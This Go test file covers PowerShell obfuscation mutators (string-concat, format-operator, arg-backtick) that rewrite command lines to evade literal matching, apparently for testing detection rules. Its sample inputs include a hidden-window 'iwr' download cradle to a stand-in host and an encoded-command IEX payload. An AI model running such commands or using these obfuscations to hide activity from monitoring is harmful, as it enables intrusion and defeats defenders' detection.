package mutate

import (
	"strings"
	"testing"
)

// rejoinConcat reverses string-concat: it pulls ('A'+'B') out of a mutated value
// and returns A+B, so a test can assert the runtime string is unchanged.
func rejoinConcat(t *testing.T, mutated string) string {
	t.Helper()
	i := strings.Index(mutated, "('")
	if i < 0 {
		t.Fatalf("no parenthesised expression in %q", mutated)
	}
	j := strings.Index(mutated[i:], "')")
	if j < 0 {
		t.Fatalf("unterminated expression in %q", mutated)
	}
	inner := mutated[i+2 : i+j] // drop the leading ('  and the trailing ')
	var sb strings.Builder
	for _, frag := range strings.Split(inner, "'+'") {
		sb.WriteString(frag)
	}
	return sb.String()
}

// rejoinFormat reverses format-operator: ('{1}{0}' -f 'B','A') reassembles to A+B.
func rejoinFormat(t *testing.T, mutated string) string {
	t.Helper()
	const head = "('{1}{0}' -f '"
	i := strings.Index(mutated, head)
	if i < 0 {
		t.Fatalf("no -f expression in %q", mutated)
	}
	rest := mutated[i+len(head):]
	j := strings.Index(rest, "')")
	if j < 0 {
		t.Fatalf("unterminated -f expression in %q", mutated)
	}
	args := strings.Split(rest[:j], "','")
	if len(args) != 2 {
		t.Fatalf("expected two format arguments, got %q", rest[:j])
	}
	return args[1] + args[0] // arg1 is the first half, arg0 the second
}

func TestStringConcat(t *testing.T) {
	cases := []struct {
		name    string
		value   string
		want    bool   // expect a mutation
		literal string // the literal that must round-trip
	}{
		{
			name:    "url literal is split and rejoined",
			value:   `powershell.exe -Command "iwr 'http://x/a.ps1'"`,
			want:    true,
			literal: "http://x/a.ps1",
		},
		{
			name:  "no single-quoted literal",
			value: `powershell.exe -NoProfile -Command iwr`,
		},
		{
			name:  "literal too short to split",
			value: `cmd.exe /c echo 'ab'`,
		},
		{
			name:  "opaque payload literal is left alone",
			value: `powershell.exe -Command 'SQBFAFgAKAB0AGUAcwB0ACkA'`,
		},
		{
			name:  "unterminated literal is refused",
			value: `powershell.exe -Command 'http://x/a.ps1`,
		},
		{
			name:  "doubled quote makes boundaries ambiguous",
			value: `powershell.exe -Command 'it''s a trap'`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := stringConcat{}.Apply(tc.value)
			if !tc.want {
				if len(got) != 0 {
					t.Fatalf("expected no mutation, got %+v", got)
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("expected one variant, got %d", len(got))
			}
			if got[0].Value == tc.value {
				t.Fatal("string-concat produced a no-op variant")
			}
			if !strings.Contains(got[0].Value, "('htt") {
				t.Errorf("expected a split starting ('htt, got %q", got[0].Value)
			}
			if rejoined := rejoinConcat(t, got[0].Value); rejoined != tc.literal {
				t.Errorf("concatenation reconstructs %q, want %q", rejoined, tc.literal)
			}
			// Everything outside the literal must survive byte for byte.
			if !strings.HasPrefix(got[0].Value, `powershell.exe -Command "iwr `) {
				t.Errorf("mutation leaked outside the literal: %q", got[0].Value)
			}
		})
	}
}

func TestFormatOperator(t *testing.T) {
	cases := []struct {
		name    string
		value   string
		want    bool
		literal string
	}{
		{
			name:    "url literal is rebuilt with -f",
			value:   `powershell.exe -Command "iwr 'http://x/a.ps1'"`,
			want:    true,
			literal: "http://x/a.ps1",
		},
		{
			name:  "literal containing a brace is skipped",
			value: `powershell.exe -Command '$env:temp\{payload}.ps1'`,
		},
		{
			name:  "opaque payload literal is left alone",
			value: `powershell.exe -Command 'SQBFAFgAKAB0AGUAcwB0ACkA'`,
		},
		{
			name:  "no literal at all",
			value: `cmd.exe /c whoami`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := formatOperator{}.Apply(tc.value)
			if !tc.want {
				if len(got) != 0 {
					t.Fatalf("expected no mutation, got %+v", got)
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("expected one variant, got %d", len(got))
			}
			if !strings.Contains(got[0].Value, "'{1}{0}' -f ") {
				t.Errorf("expected a '{1}{0}' -f form, got %q", got[0].Value)
			}
			if rejoined := rejoinFormat(t, got[0].Value); rejoined != tc.literal {
				t.Errorf("-f expression reconstructs %q, want %q", rejoined, tc.literal)
			}
			// The original contiguous literal must no longer be present, otherwise
			// the mutation would not be an evasion at all.
			if strings.Contains(got[0].Value, "'"+tc.literal+"'") {
				t.Errorf("literal survived intact in %q", got[0].Value)
			}
		})
	}
}

func TestArgBacktick(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  string // expected substring, empty means expect no mutation
	}{
		{
			name:  "window style gets a backtick after the third letter",
			value: `powershell.exe -WindowStyle Hidden -Command iwr`,
			want:  "-Win`dowStyle",
		},
		{
			name:  "third letter unsafe so a later position is used",
			value: `Get-Process -Verbose`,
			want:  "-Verb`ose", // -Ver`bose, -V`erbose, -Ve`rbose all form escapes
		},
		{
			name:  "encoded command flag is ticked, payload untouched",
			value: `powershell.exe -EncodedCommand SQBFAFgAKAB0AGUAcwB0ACkA`,
			want:  "-Enc`odedCommand",
		},
		{
			name:  "no parameter token",
			value: `cmd.exe /c whoami`,
		},
		{
			name:  "short flags are not parameter names",
			value: `powershell.exe -enc AAAA`,
		},
		{
			name:  "dash inside a single-quoted literal is not a parameter",
			value: `powershell.exe 'iwr -UseBasicParsing'`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := argBacktick{}.Apply(tc.value)
			if tc.want == "" {
				if len(got) != 0 {
					t.Fatalf("expected no mutation, got %+v", got)
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("expected one variant, got %d", len(got))
			}
			if got[0].Value == tc.value {
				t.Fatal("arg-backtick produced a no-op variant")
			}
			if !strings.Contains(got[0].Value, tc.want) {
				t.Errorf("expected %q in %q", tc.want, got[0].Value)
			}
			// Exactly one backtick, and never one that forms an escape sequence.
			if n := strings.Count(got[0].Value, "`"); n != 1 {
				t.Errorf("expected exactly one backtick, got %d in %q", n, got[0].Value)
			}
			i := strings.IndexByte(got[0].Value, '`')
			if i+1 >= len(got[0].Value) {
				t.Fatalf("backtick is the last character of %q", got[0].Value)
			}
			if next := got[0].Value[i+1]; !pssSafeAfterTick(next) {
				t.Errorf("backtick precedes escape character %q in %q", next, got[0].Value)
			}
			// Removing the backtick must give back the original command line.
			if stripped := strings.ReplaceAll(got[0].Value, "`", ""); stripped != tc.value {
				t.Errorf("stripping the backtick yields %q, want %q", stripped, tc.value)
			}
		})
	}
}

func TestPSStringMutatorsPreserveOpaquePayload(t *testing.T) {
	const payload = "SQBFAFgAKAB0AGUAcwB0ACkA"
	value := `powershell.exe -EncodedCommand '` + payload + `'`
	for _, m := range []Mutator{stringConcat{}, formatOperator{}} {
		if got := m.Apply(value); len(got) != 0 {
			t.Errorf("%s reshaped an opaque payload literal: %+v", m.Name(), got)
		}
	}
	// arg-backtick may rewrite the parameter name, but never the payload itself.
	for _, r := range (argBacktick{}).Apply(value) {
		if !strings.Contains(r.Value, payload) {
			t.Errorf("arg-backtick corrupted the payload: %q", r.Value)
		}
	}
}

func TestPSStringMutatorsAreDeterministic(t *testing.T) {
	const value = `powershell.exe -WindowStyle Hidden -Command "iwr 'http://x/a.ps1'"`
	for _, m := range []Mutator{stringConcat{}, formatOperator{}, argBacktick{}} {
		first := m.Apply(value)
		if len(first) == 0 {
			t.Fatalf("%s produced no variant for the sample value", m.Name())
		}
		for i := 0; i < 5; i++ {
			again := m.Apply(value)
			if len(again) != len(first) {
				t.Fatalf("%s output length varies between runs", m.Name())
			}
			for j := range again {
				if again[j] != first[j] {
					t.Fatalf("%s output varies: %v vs %v", m.Name(), first, again)
				}
			}
		}
	}
}

func TestPSStringMutatorsAreRegistered(t *testing.T) {
	want := map[string]bool{"string-concat": false, "format-operator": false, "arg-backtick": false}
	for _, m := range Catalog() {
		if _, ok := want[m.Name()]; ok {
			want[m.Name()] = true
		}
	}
	for name, seen := range want {
		if !seen {
			t.Errorf("mutator %q is not in the catalog", name)
		}
	}
}
